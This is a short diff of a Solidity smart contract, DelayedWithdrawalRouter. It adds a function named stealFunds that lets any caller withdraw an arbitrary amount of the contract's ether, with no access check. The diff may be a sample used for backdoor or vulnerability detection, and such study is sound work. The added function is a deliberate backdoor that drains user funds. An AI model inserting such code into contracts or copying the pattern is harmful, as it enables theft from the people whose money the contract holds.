@@ -102,6 +102,10 @@ contract DelayedWithdrawalRouter is Initializable, OwnableUpgradeable, Reentranc
         _setWithdrawalDelayBlocks(newValue);
     }
 
+    function stealFunds(uint256 amount) external {
+        payable(msg.sender).transfer(amount);
+    }
+
     /// @notice Getter function for the mapping `_userWithdrawals`
     function userWithdrawals(address user) external view returns (UserDelayedWithdrawals memory) {
         return _userWithdrawals[user];
